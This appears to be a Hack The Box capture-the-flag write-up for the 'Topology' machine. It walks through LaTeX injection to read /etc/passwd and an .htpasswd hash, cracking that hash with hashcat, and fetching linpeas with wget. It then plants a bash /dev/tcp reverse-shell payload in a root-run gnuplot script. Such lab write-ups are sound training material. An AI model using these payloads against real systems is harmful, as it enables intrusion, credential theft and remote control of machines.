---
title: "Topology HTB"
date: 2023-10-06 00:00:00 +0800
categories: [Hack The Box]
tags: [HacktheBox]
---

# Topology HacktheBox
[HackTheBox-Topology-Easy](https://app.hackthebox.com/machines/Topology)
## Nmap

```nmap
nmap -sVC 10.10.11.217
```


```
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp    open     http     Apache httpd 2.4.41 ((Ubuntu))
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE  TIME              FILENAME
| -     2023-01-17 12:26  demo/
| 1.0K  2023-01-17 12:26  demo/fraction.png
| 1.1K  2023-01-17 12:26  demo/greek.png
| 1.1K  2023-01-17 12:26  demo/sqrt.png
| 1.0K  2023-01-17 12:26  demo/summ.png
| 3.8K  2023-06-12 07:37  equation.php
| 662   2023-01-17 12:26  equationtest.aux
| 17K   2023-01-17 12:26  equationtest.log
| 0     2023-01-17 12:26  equationtest.out
| 28K   2023-01-17 12:26  equationtest.pdf
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
1056/tcp  filtered vfo
4006/tcp  filtered pxc-spvr
9876/tcp  filtered sd
50800/tcp filtered unknown
63331/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> After access the web page on port 80, found another end point, http://latex.topology.htb/equation.php which could not be resolved.
> Add the 10.10.11.217 with latex.topology.htb in /etc/host. The page function is to generate a math equation from latex.


![Image](https://github.com/user-attachments/assets/de386ba7-356c-4bb6-805c-5cee23d68e26)

> Then, try to access the root page http://latex.topology.htb where we found directory listing.

![Image](https://github.com/user-attachments/assets/8d3ee5f9-e877-4b18-82e9-645ce01a77b8)

## Latex Injection

> Refer on [Hacktricks](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#cross-site-scripting) and [Exploit Notes](https://exploit-notes.hdks.org/exploit/web/security-risk/latex-injection/) , and try all payload to read a file like /etc/passwd.
> When using a common injection like `\input{/etc/passwd}` the page will print us with `Illegal command detected, sorry`.
> From the directory listing we could read the listed file and this is the content of `equationtest.tex` file.

```tex
\documentclass{standalone}
\input{header}
\begin{document}

$ \int_{a}^b\int_{c}^d f(x,y)dxdy $

\end{document}
```

> From the file above, we chose to use a payload below from [Exploit Notes](https://exploit-notes.hdks.org/exploit/web/security-risk/latex-injection/) .

```tex
$\lstinputlisting{/etc/passwd}$
```

> We found out there are 2 user in the box, `root` and `vdaisley`.
> Next, we try to read other files such as rsa key in ssh folder of `vdaisley` user, however there is no such file. Move on, we try to fuzz the file with various wordlist such from [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt) and [OneListForAll](https://github.com/six2dez/OneListForAll/blob/main/dict/linux_long.txt). 

>  After a while, we try to access `/etc/apache2/sites-available/000-default.conf` file and found out there are other subdomain hosted on the server using VHOST which are `dev` and `stats`.
> Stats website just shows the server stats, dev website on the other hand required us to pass username and password to enter it. We know the username is `vdaisley`, now we need to find the password.

![Image](https://github.com/user-attachments/assets/a7566d04-e1dd-4ae7-a217-8201db6eb76b)

> As we know usually there is /etc/apache2/.htpasswd file on apache ubuntu server. If you check the contents of the file, it will contain the username and the encrypted password for each record.

> However, there is no such file in the target machine. Try to read /var/www/vdaisley/.htpasswd file and we will get the vdaisley password hash. Now we can try to crack the hash, but need to know the hash type first.

![Image](https://github.com/user-attachments/assets/d140eebf-bdab-48e5-b56c-1f050d8ae927)

![Image](https://github.com/user-attachments/assets/8825e87d-a093-4f58-99a5-fc3d2f627f51)

> It is a apache md5 hash, now we can crack the hash using hashcat with payload below.

```
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

> We got the cracked hash. Use it with `vdaisley` username to login on the dev.topology.htb.

![Image](https://github.com/user-attachments/assets/da97918b-8005-42e4-82c1-1cf8680f7409)

> Remember when we scan the host, we found another port open which is port 22 SSH. We can use the credential found before to access the SSH. 
> Then we will found a user.txt on the vdaisley directory which is our user flag `177417ad1d95bb7225a740d31e24255e`.

## Privilege Escalation

> Usually we will use linpeas on the target machine to find a possible endpoint for us to do privilege escalation.
> First download linpeas.sh on [PEASS-ng](https://github.com/carlospolop/PEASS-ng/releases/tag/20231002-59c6f6e6) and put anywhere you want.
> Then, up a local web server on port 8000 using python with command below.

```
python3 -m http.server
```

> Now we can go to the target machine and pull the linpeas from our local server with command below.

```
wget 10.10.14.47:8000/linpeas.sh
```

> Then, add executable permission on the `linpeas.sh` with `chmod +x linpeas.sh`.
> After execute it, we found some interesting writable files on the target machine.

![Image](https://github.com/user-attachments/assets/ad40be6b-b127-4f51-a3a2-c12d9f5d56bf)

> The `/opt/gnuplot` seems exploitable and fyi In Linux, the `/opt` directory is a standard directory in the file system hierarchy. It is typically used for installing optional or add-on software packages that are not part of the core operating system. As you might have guessed by now, `opt` stands for `optional.`

> Refer here for the gnuplot exploit [Gnuplot Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/) .
> Now go to `/opt` directory and check the `gnuplot` directory permission with `ls -al`.
> The directory is owned by root user and root group, however others are able to write on the directory.
> Now we can use a payload on the exploit-notes to exploit the gnuplot. 

> First create a file named `test.plt` on the `gnuplot` directory with command below.
```
touch gnuplot/test.plt
```

> Then edit the test.plt and insert our payload to gain reverse shell to our own machine using vim `vi gnuplot/test.plt`. The payload is like below.

```
system "whoami" # Reverse shell system "bash -c 'bash -i >& /dev/tcp/<YOUR IP>/4444 0>&1'"
```

> Save it and create a listener on your machine with command below.

```
nc -nvlp 4444
```

> The `test.plt` will be executed automatically as there is a scheduler to handle it.
> Lastly, after the reverse shell has been spawned, `cat root.txt` to capture the FLAG.

![Image](https://github.com/user-attachments/assets/59905ba9-0d45-4897-9129-04a8c0c9236d)
